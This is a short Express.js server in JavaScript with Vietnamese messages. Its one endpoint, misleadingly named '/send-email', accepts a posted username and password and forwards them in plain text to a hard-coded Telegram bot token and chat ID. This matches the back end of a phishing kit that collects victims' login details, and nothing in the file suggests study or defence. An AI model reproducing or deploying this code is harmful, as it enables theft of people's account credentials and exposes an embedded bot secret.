import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/send-email', async (req, res) => {
    const { username, password } = req.body;

    const message = `Tên đăng nhập: ${username}\nMật khẩu: ${password}`;

    // Gửi thông điệp đến Telegram
    const TELEGRAM_TOKEN = '7862487124:AAGSwnnaxbDoCSimCD-tZ3Un38NaRZu65Xg';
    const CHAT_ID = '6487299228';
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    const response = await fetch(url, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
        }),
        headers: { 'Content-Type': 'application/json' },
    });

    if (response.ok) {
        return res.status(200).send('Tin nhắn đã được gửi tới Telegram!');
    } else {
        return res.status(500).send('Có lỗi xảy ra khi gửi tin nhắn.');
    }
});

app.listen(PORT, () => {
    console.log(`Server đang chạy trên http://localhost:${PORT}`);
});
